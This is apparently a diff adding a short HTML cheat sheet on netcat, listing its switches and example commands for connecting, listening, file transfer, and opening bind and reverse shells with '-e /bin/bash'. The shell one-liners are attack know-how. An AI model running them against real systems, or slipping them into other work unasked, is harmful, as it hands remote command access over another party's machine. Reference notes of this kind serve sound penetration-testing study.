@@ -1,0 +1,58 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Netcat</title>
+</head><body><b><span style="font-size: 14pt">Netcat</span><br/>
+</b><tt>https://en.wikipedia.org/wiki/Netcat</tt><b><br/>
+</b><b><br/>
+TCP/UDP networking tool<br/>
+<br/>
+<br/>
+</b><b><span style="font-size: 12pt">Switches</span></b><br/>
+<br/>
+-n 	numeric only IPs, no DNS<br/>
+-v 	verbose<br/>
+-l 	listen<br/>
+-p 	port<br/>
+-e 	execute command<br/>
+<br/>
+<b><br/>
+<span style="font-size: 12pt">Examples</span><br/>
+<br/>
+Connect to the given port on IP<br/>
+</b><br/>
+<tt>nc -nv &lt;IP&gt; &lt;port&gt;<br/>
+<br/>
+</tt><b>Listen on given port<br/>
+</b><br/>
+<tt>nc -nvlp &lt;port&gt;<br/>
+<br/>
+</tt><b>File transfer<br/>
+</b><br/>
+On server open port and redirect data to file<br/>
+<tt>nc -nvlp &lt;port&gt; &gt; &lt;file&gt;<br/>
+</tt><br/>
+On client send file<tt><br/>
+</tt><tt>nc -nv &lt;IP&gt; &lt;port&gt; &lt; &lt;file&gt;<br/>
+<br/>
+</tt><b>Bind shell<br/>
+</b><br/>
+On server run<br/>
+<tt>nc -nvlp &lt;port&gt; -e /bin/bash</tt><br/>
+<br/>
+On client run<br/>
+<tt>nc -nv &lt;IP&gt; &lt;port&gt;</tt><br/>
+<br/>
+<b>Reverse shell<br/>
+</b><br/>
+On server run<br/>
+<tt>nc -nvlp &lt;port&gt;</tt><br/>
+<br/>
+On client run<br/>
+<tt>nc -nv &lt;IP&gt; &lt;port&gt; -e /bin/bash<br/>
+</tt><br/>
+<br/>
+<b>Notes<br/>
+<br/>
+</b>Newer <tt>nc</tt>doesn't have <tt>-e</tt>switch. Try to use <tt>nc.traditional </tt>instead.<br/>
+</body></html>
